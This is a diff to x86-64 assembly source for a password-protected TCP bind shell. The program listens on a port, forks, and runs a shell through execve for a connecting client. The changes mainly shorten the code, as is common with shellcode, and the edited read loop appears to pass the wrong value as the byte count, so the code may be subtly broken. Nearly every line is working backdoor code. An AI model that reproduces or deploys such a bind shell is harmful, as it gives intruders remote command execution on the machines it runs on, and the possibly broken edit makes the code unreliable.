@@ -1,3 +1,4 @@
+; TCP BIND SERVER
 ; compile with
 ; nasm -f out -o ts tcp-serv.asm
 ; the resulting tb file is the whole executable
@@ -193,8 +194,15 @@ password_check:
 %endif
         mov al, SYS_FORK
         syscall
-        test eax, eax
-        jnz next_iteration                  ; wait for next command if we aren't the child
+        xchg eax, ecx
+        jrcxz childcase                     ; if we are the child then continue execution
+        push SYS_CLOSE
+        pop rax
+        syscall
+        push rbp
+        pop rdi
+        jmp run_once      
+childcase:
         ; read the function we want to call
         ; all the params are already set
         syscall                             ; SYS_READ
@@ -227,15 +235,7 @@ exec_shell:
 
         mov al, SYS_EXECVE                  ; finally call execve in child
         syscall
-
-next_iteration:
-        push SYS_CLOSE
-        pop rax
-        syscall
-        push rbp
-        pop rdi
-        jmp run_once
-
+        
 exitserver:
         mov al, SYS_EXIT
         syscall
@@ -278,8 +278,8 @@ readloop:
         mov edx, ebp
         xor eax, eax
         syscall                             ; read data to buffer
-        test eax, eax
-        jz exitserver                       ; if we read zero bytes then stop
+        xchg eax, ecx
+        jrcxz exitserver                    ; if we read zero bytes then stop                       
         push rax
         pop rdx
         mov rdi, r15
